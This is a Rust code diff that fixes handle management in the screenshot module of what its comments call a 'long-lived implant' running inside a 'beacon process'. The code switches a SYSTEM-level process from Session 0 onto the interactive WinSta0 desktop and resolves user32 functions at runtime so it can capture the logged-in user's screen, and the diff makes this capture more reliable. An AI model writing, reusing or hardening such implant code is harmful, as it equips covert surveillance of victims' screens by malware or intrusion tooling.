@@ -313,21 +313,54 @@ fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
 /// → SelectObject → BitBlt(SRCCOPY|CAPTUREBLT) → memcpy out of the DIB's mapped
 /// `ppvBits` → assemble BMP → cleanup. Every DC/bitmap handle is released on
 /// every return path; a leak here kills the long-lived implant.
-/// Best-effort relocation to the interactive window station + desktop.
+/// Ownership bundle for the window-station switch performed by
+/// [`attach_interactive`]. Passed by value to [`detach_interactive`] so the
+/// restore + close happen against EXACTLY the handles this call opened — no
+/// process-wide `static mut` state, no re-entrancy hazard.
+///
+/// CRITICAL-13 fix: the previous design stored these in `static mut
+/// CAPTURE_WINSTA_ORIGINAL` / `CAPTURE_WINSTA_OPENED`, which broke under
+/// re-entry (e.g. `count_displays` + `screenshot` in one cycle): the second
+/// `attach_interactive` overwrote `ORIGINAL` with the *already-switched*
+/// WinSta0 pseudo-handle, so `detach_interactive` restored to the wrong
+/// station AND closed the borrowed `GetProcessWindowStation` pseudo-handle.
+/// Passing the pair as locals makes every attach/detach self-contained.
+#[derive(Clone, Copy)]
+struct WinstaGuard {
+    /// Handle saved from `GetProcessWindowStation` BEFORE switching. This is a
+    /// BORROWED pseudo-handle owned by the process — [`detach_interactive`]
+    /// MUST restore the process to it but MUST NOT `CloseWindowStation` it.
+    original: *mut core::ffi::c_void,
+    /// Handle from `OpenWindowStationW("WinSta0")`. This is an OWNED handle —
+    /// [`detach_interactive`] closes it after restoring `original`.
+    opened: *mut core::ffi::c_void,
+}
+
+/// Best-effort relocation to the interactive window station and desktop.
 ///
 /// In Session 0 (SYSTEM service) the process is attached to a non-interactive
 /// station (`Service-0x0-3e7$/Default`) with no GUI surface, so `GetDC(NULL)`
-/// + `BitBlt` fail. This opens `WinSta0` + its `default` desktop and attaches
-/// the current thread to them, so subsequent GDI calls see the interactive
-/// session. Returns true on success. Best-effort — failures are silent (the
+/// and `BitBlt` fail. This opens `WinSta0` and its `default` desktop and
+/// attaches the current thread to them, so subsequent GDI calls see the
+/// interactive session. Returns `Some(WinstaGuard)` on success (caller MUST
+/// pass it to [`detach_interactive`]); `None` on any resolution/open failure
+/// (nothing to clean up in that case). Best-effort — failures are silent (the
 /// caller proceeds and surfaces the real GDI error).
 ///
 /// # Safety
 /// Resolves + calls user32 exports via raw pointers; all are idempotent/safe
 /// in isolation (OpenWindowStationW/SetProcessWindowStation/OpenDesktopW/
 /// SetThreadDesktop/CloseDesktop/CloseWindowStation).
-unsafe fn attach_interactive() -> bool {
-    use core::ffi::c_void;
+//
+// NOTE: the per-export `match export_addr(...) { Some(a) => transmute(a), None
+// => return None }` blocks below are intentionally kept in match form (rather
+// than `?`) for consistency with the rest of the crate (every other Win32
+// resolver in screenshot.rs uses the same pattern). Clippy's question_mark
+// suggestion only became applicable because this fn's return type changed from
+// `bool` to `Option<WinstaGuard>` in the CRITICAL-13 fix; the style is
+// preserved deliberately.
+#[allow(clippy::question_mark)]
+unsafe fn attach_interactive() -> Option<WinstaGuard> {
     type OpenWindowStationW = unsafe extern "system" fn(*const u16, i32, u32) -> *mut c_void;
     type GetProcessWindowStation = unsafe extern "system" fn() -> *mut c_void;
     type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
@@ -339,48 +372,45 @@ unsafe fn attach_interactive() -> bool {
     let ows: OpenWindowStationW =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let gpws: GetProcessWindowStation =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"GetProcessWindowStation") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let spws: SetProcessWindowStation =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let odk: OpenDesktopW =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let std: SetThreadDesktop =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetThreadDesktop") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let cd: CloseDesktop =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseDesktop") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let cws: CloseWindowStation =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
 
-    // Save the process's current window station so the caller can restore it
-    // AFTER the capture.  Per MSDN, the handle returned by
-    // GetProcessWindowStation must NOT be closed — it is a borrowed
-    // pseudo-handle owned by the process.  We store it in a static; the
-    // caller must call detach_interactive() after the GDI operations.
+    // Save the process's current window station so detach_interactive() can
+    // restore it AFTER the capture. Per MSDN, the handle returned by
+    // GetProcessWindowStation is a BORROWED pseudo-handle owned by the process
+    // and MUST NOT be closed — detach_interactive only restores via
+    // SetProcessWindowStation, never closes this one.
     let original_winsta: *mut c_void = unsafe { gpws() };
-    unsafe {
-        CAPTURE_WINSTA_ORIGINAL = original_winsta;
-    }
 
     let mut winsta_name = crate::heap::Vec::<u16>::with_capacity(8);
     for &b in b"WinSta0\0" {
@@ -388,15 +418,14 @@ unsafe fn attach_interactive() -> bool {
     }
     let hwinsta = unsafe { ows(winsta_name.as_ptr(), 0, 0xC0_00_00_66) };
     if hwinsta.is_null() {
-        return false;
+        // Nothing was switched and nothing was opened — no cleanup needed.
+        return None;
     }
     if unsafe { spws(hwinsta) } == 0 {
+        // SetProcessWindowStation failed — close the opened handle and bail
+        // with no guard (the process is still on its original station).
         let _ = unsafe { cws(hwinsta) };
-        return false;
-    }
-    // Store the WinSta0 handle so detach_interactive() can close it.
-    unsafe {
-        CAPTURE_WINSTA_OPENED = hwinsta;
+        return None;
     }
 
     // Open the default desktop and attach the thread.  The desktop handle is
@@ -407,24 +436,45 @@ unsafe fn attach_interactive() -> bool {
         desk_name.push(b as u16);
     }
     let hdesk = unsafe { odk(desk_name.as_ptr(), 0, 0, 0xC0_00_00_66) };
-    let ok = if !hdesk.is_null() {
+    let _ok = if !hdesk.is_null() {
         let r = unsafe { std(hdesk) };
         let _ = unsafe { cd(hdesk) };
         r != 0
     } else {
         false
     };
-    // DO NOT restore the original window station here — the caller needs it
-    // active for the GDI capture.  detach_interactive() does the restore.
-    ok
+    // DO NOT restore the original window station here — the caller needs
+    // WinSta0 active for the GDI capture. detach_interactive() does the
+    // restore + close using the guard we hand back. Returning the guard even
+    // when SetThreadDesktop failed: the process IS switched to WinSta0, so the
+    // caller must still detach to restore + close.
+    Some(WinstaGuard {
+        original: original_winsta,
+        opened: hwinsta,
+    })
 }
 
 /// Restore the original window station and close the WinSta0 handle opened
-/// by [`attach_interactive`].  Must be called after the GDI capture is
-/// complete.  Safe to call even if attach_interactive failed (statics are
-/// zero-initialized and the null checks below make it a no-op).
-unsafe fn detach_interactive() {
-    use core::ffi::c_void;
+/// by [`attach_interactive`]. Must be called exactly once per successful
+/// attach, with the [`WinstaGuard`] that attach returned. Takes the guard BY
+/// VALUE — this is the crux of the CRITICAL-13 fix: every detach operates on
+/// the exact handles its matching attach opened, so re-entrant or back-to-back
+/// attach/detach pairs cannot overwrite each other's saved state.
+///
+/// CRITICAL-13: the previous design read shared `static mut` state, so a
+/// second attach before the first detach clobbered `ORIGINAL` with the
+/// already-switched WinSta0 pseudo-handle. The detach then (a) restored the
+/// process to the WRONG station and (b) closed the borrowed
+/// `GetProcessWindowStation` pseudo-handle (MSDN: must NOT be closed) — a
+/// handle leak + UAF on the borrowed handle. With the guard passed by value
+/// there is no shared state to clobber.
+///
+/// Safety contract on the guard handles:
+/// - `guard.original` came from `GetProcessWindowStation` → BORROWED, restored
+///   via `SetProcessWindowStation` but NEVER closed.
+/// - `guard.opened` came from `OpenWindowStationW` → OWNED, closed via
+///   `CloseWindowStation` AFTER the restore.
+unsafe fn detach_interactive(guard: WinstaGuard) {
     type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
     let cws: CloseWindowStation =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
@@ -439,26 +489,18 @@ unsafe fn detach_interactive() {
         };
 
     // Restore the original window station BEFORE closing our WinSta0 handle.
-    // Closing the active station is undefined behaviour (per MSDN).
-    let orig = unsafe { CAPTURE_WINSTA_ORIGINAL };
-    if !orig.is_null() {
-        let _ = unsafe { spws(orig) };
+    // Closing the active station is undefined behaviour (per MSDN), so the
+    // restore must land first.
+    if !guard.original.is_null() {
+        let _ = unsafe { spws(guard.original) };
     }
-    let opened = unsafe { CAPTURE_WINSTA_OPENED };
-    if !opened.is_null() {
-        let _ = unsafe { cws(opened) };
-    }
-    unsafe {
-        CAPTURE_WINSTA_ORIGINAL = core::ptr::null_mut();
-        CAPTURE_WINSTA_OPENED = core::ptr::null_mut();
+    // Close ONLY the handle we opened (OpenWindowStationW). The `original`
+    // pseudo-handle from GetProcessWindowStation is borrowed and must NOT be
+    // closed (MSDN) — we deliberately do not touch it here.
+    if !guard.opened.is_null() {
+        let _ = unsafe { cws(guard.opened) };
     }
 }
-
-/// Saved original window station handle (from GetProcessWindowStation).
-/// Borrowed pseudo-handle — never close it.
-static mut CAPTURE_WINSTA_ORIGINAL: *mut core::ffi::c_void = core::ptr::null_mut();
-/// WinSta0 handle opened by attach_interactive — must be closed in detach_interactive.
-static mut CAPTURE_WINSTA_OPENED: *mut core::ffi::c_void = core::ptr::null_mut();
 
 /// Count available displays via `EnumDisplayMonitors`. Diagnostic only —
 /// screenshot capture (`capture_bmp` / `do_screenshot`) is single-virtual-
@@ -580,7 +622,10 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     // Process-level fallback for pre-1607 hosts. Must come BEFORE any
     // GetDC / CreateDIBSection.
     let dpi_aware = set_dpi_aware() || old_ctx.is_some();
-    let _ = unsafe { attach_interactive() };
+    // CRITICAL-13: attach returns an owned WinstaGuard (or None if nothing was
+    // switched). The guard is threaded through to detach so the restore+close
+    // hits exactly these handles — no process-wide static state.
+    let winsta_guard = unsafe { attach_interactive() };
 
     // Wrap in a closure so detach_interactive() runs on EVERY return path
     // (including the `?` early-returns from export_addr resolution).
@@ -757,7 +802,12 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
 
     // Restore the original window station + close our WinSta0 handle on every
     // exit path (success, screen-size check failure, GDI failure, etc.).
-    unsafe { detach_interactive() };
+    // CRITICAL-13: only detach if attach actually switched stations — passing
+    // the guard by value makes this pair self-contained (no shared state to
+    // clobber under re-entry or back-to-back captures).
+    if let Some(guard) = winsta_guard {
+        unsafe { detach_interactive(guard) };
+    }
     // Restore the thread DPI context (matters for path 1 inside the beacon
     // process, which keeps running; the helper exits anyway).
     if let Some(o) = old_ctx {
